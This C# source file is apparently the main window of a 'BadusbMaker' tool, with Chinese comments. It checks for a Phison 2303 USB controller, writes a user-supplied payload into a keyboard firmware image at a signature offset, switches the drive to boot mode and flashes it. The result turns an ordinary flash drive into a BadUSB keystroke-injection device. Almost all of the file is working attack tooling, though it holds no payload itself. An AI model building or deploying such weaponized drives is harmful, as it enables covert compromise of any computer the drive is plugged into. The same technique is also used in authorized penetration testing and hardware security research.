using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace BadusbMaker
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class FormMain : Window
    {
        private bool isFailed;
        private PhisonDevice pd = null;
        private string panelText;
        public FormMain()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            this.panelText = string.Empty;
            this.resultPanel.Text = this.panelText;
            //检查参数
            if (!this.check())
            {
                return;
            }

            //打开U盘
            if (pd != null)
            {
                pd.Close();
                pd = null;
            }

            pd = new PhisonDevice(this.letter.Text);
            pd.Open();

            //检查主控是否正确
            this.panelText += "Check Controller..." + "\n";
            this.resultPanel.Text = panelText;
            string checkControllerResult = this.checkController();
            this.panelText += checkControllerResult + "\n";
            this.resultPanel.Text = panelText;
            if (this.isFailed)
            {
                this.panelText += "chip is wrong!!" + "\n";
                this.panelText += "exited!!" + "\n";
                this.resultPanel.Text = panelText;
                return;
            }

            this.panelText += "\n";
            this.resultPanel.Text = panelText;

            //将payload嵌入常规键盘固件
            this.panelText += "Embed payload..." + "\n";
            this.resultPanel.Text = panelText;
            File.Copy(GlobalVars.CurrentPath + @"\tools\fw.bin", GlobalVars.CurrentPath + @"\fw.bin",true);
            string embedResult = this.embedPayload(this.payloadPath.Text, GlobalVars.CurrentPath + @"\fw.bin");
            this.panelText += "\n";
            this.resultPanel.Text = panelText;
            if (this.isFailed)
            {
                this.panelText += "exited!!" + "\n";
                this.resultPanel.Text = panelText;
                return;
            }

            this.panelText += "\n";
            this.resultPanel.Text = panelText;

            //设置启动模式
            this.panelText += "SetBootMode..." + "\n";
            this.resultPanel.Text = panelText;
            string setBootModeResult = this.setBootMode();
            this.panelText += setBootModeResult + "\n";
            this.resultPanel.Text = panelText;
            if (this.isFailed)
            {
                this.panelText += "exited!!" + "\n";
                this.resultPanel.Text = panelText;
                return;
            }

            this.panelText += "\n";
            this.resultPanel.Text = panelText;

            //写入烧录器
            this.panelText += "SendExecutable..." + "\n";
            this.resultPanel.Text = panelText;
            string sendExecutableResult = this.sendExecutable(GlobalVars.CurrentPath + @"\tools\BN03V104M.BIN");
            this.panelText += sendExecutableResult + "\n";
            this.resultPanel.Text = panelText;
            if (this.isFailed)
            {
                this.panelText += "exited!!" + "\n";
                this.resultPanel.Text = panelText;
                return;
            }
            //Wait a little bit
            Thread.Sleep(2000);

            this.panelText += "\n";
            this.resultPanel.Text = panelText;

            //刷入固件
            this.panelText += "SendFirmware..." + "\n";
            this.resultPanel.Text = panelText;
            string sendFirmwareResult = this.sendFirmware(GlobalVars.CurrentPath + @"\fw.bin");
            this.panelText += sendFirmwareResult + "\n";
            this.resultPanel.Text = panelText;
            if (this.isFailed)
            {
                this.panelText += "exited!!" + "\n";
                this.resultPanel.Text = panelText;
                return;
            }

            this.panelText += "\n";
            this.resultPanel.Text = panelText;

            MessageBox.Show("Make Succeed！！");
        }

        private string sendFirmware(string fwPath)
        {
            string result = string.Empty;
            //Get file data
            var fw = new FileStream(fwPath, FileMode.Open);
            var data = new byte[fw.Length];
            fw.Read(data, 0, data.Length);
            fw.Close();

            //TODO: Find out what this actually does...
            //Console.WriteLine("Sending scary B7 command (takes several seconds)...");
            //_device.SendCommand(new byte[] { 0x06, 0xB7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            try
            {
                result += "Rebooting..." + "\n";
                pd.JumpToBootMode();
                Thread.Sleep(2000);

                result += "Sending firmware..." + "\n";
                pd.TransferFile(data, 0x01, 0x00);
                var ret = pd.SendCommand(new byte[] { 0x06, 0xEE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 64 + 8);
                Thread.Sleep(2000);
                pd.TransferFile(data, 0x03, 0x02);
                ret = pd.SendCommand(new byte[] { 0x06, 0xEE, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 }, 64 + 8);
                Thread.Sleep(2000);
                ret = pd.SendCommand(new byte[] { 0x06, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 64 + 8);
                Thread.Sleep(2000);
                ret = pd.SendCommand(new byte[] { 0x06, 0xEE, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 }, 64 + 8);
                Thread.Sleep(2000);

                result += "Executing..." + "\n";
                pd.JumpToPRAM();
                Thread.Sleep(2000);

                //Display new mode, if we can actually get it
                result += "Mode: " + pd.GetRunMode().ToString() + "\n";

                this.isFailed = false;
                return result;
            }
            catch (Exception ex)
            {
                this.isFailed = true;
                result += ex.Message;
                return result;
            }

        }

        private string sendExecutable(string burnerPath)
        {
            //Read image
            var file = new FileStream(burnerPath, FileMode.Open);
            var fileData = new byte[file.Length];
            file.Read(fileData, 0, fileData.Length);
            file.Close();

            //Load it
            try
            {
                pd.TransferFile(fileData);
                pd.JumpToPRAM();
                this.isFailed = false;
                return "secceed";
            }
            catch (Exception ex)
            {
                this.isFailed = true;
                return ex.Message;
            }
        }

        private string checkController()
        {
            string result = string.Empty;
            try
            {
                
                result += "Gathering information..." + "\n";
                string type = pd.GetChipType().GetValueOrDefault().ToString("X04");

                result += "Reported chip type: " + type + "\n";
                result += "Reported chip ID: " + pd.GetChipID() + "\n";
                result += "Reported firmware version: " + pd.GetFirmwareVersion() + "\n";

                var ret = pd.GetRunMode();
                result += "Mode: " + ret.ToString() + "\n";

                if (type == "2303")
                {
                    this.isFailed = false;
                }
                else
                {
                    this.isFailed = true;
                }
                return result;

            }
            catch (Exception ex)
            {
                this.isFailed = true;
                result += ex.Message + "\n";
                return result;
            }


        }

        private string setBootMode()
        {
            try
            {
                pd.JumpToBootMode();
                Thread.Sleep(2000);
                this.isFailed = false;
                return "succeed";
            }
            catch (Exception ex)
            {
                this.isFailed = true;
                return ex.Message;
            }

        }

        private bool check()
        {
            if (this.payloadPath.Text == string.Empty)
            {
                MessageBox.Show("Payload cannot be empty!!");
                return false;
            }

            if (this.letter.Text == string.Empty)
            {
                MessageBox.Show("Letter cannot be empty!!");
                return false;
            }

            return true;
        }

        private string embedPayload(string injectPath,string commonFwPath)
        {
            try
            {

                //Read all bytes from input file
                var payload = File.ReadAllBytes(injectPath);

                //Read all bytes from output file:
                var stream = new FileStream(commonFwPath, FileMode.Open, FileAccess.ReadWrite);
                var header = new byte[0x200];
                stream.Read(header, 0, header.Length);
                var data = new byte[0x6000];
                stream.Read(data, 0, data.Length);

                //  Look for 0x12345678
                var signature = new byte[] { 0x12, 0x34, 0x56, 0x78 };
                int? address = null;
                for (int i = 0; i < data.Length; i++)
                {
                    bool match = true;
                    for (int j = 0; j < signature.Length; j++)
                    {
                        if (data[i + j] != signature[j])
                        {
                            match = false;
                            break;
                        }
                    }

                    if (match)
                    {
                        address = i;
                        break;
                    }
                }

                //  When found, overwrite with input data
                if (address.HasValue)
                {
                    if ((0x200 + address.Value) >= 0x6000)
                    {
                        return "Insufficient memory to inject file!";
                    }

                    stream.Seek(0x200 + address.Value, SeekOrigin.Begin);
                    stream.Write(payload, 0, payload.Length);

                    //Save output file back out
                    stream.Close();
                    this.isFailed = false;
                    return "Succeed.";
                }
                else
                {
                    this.isFailed = true;
                    return "Signature not found!";
                }
            }
            catch (Exception ex)
            {
                this.isFailed = true;
                return "FATAL: " + ex.ToString();
            }
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            Microsoft.Win32.OpenFileDialog ofd = new Microsoft.Win32.OpenFileDialog();
            ofd.Filter = "bin file|*.bin";
            if (ofd.ShowDialog() == true)
            {
                this.payloadPath.Text = ofd.FileName;
            }
        }
    }
}
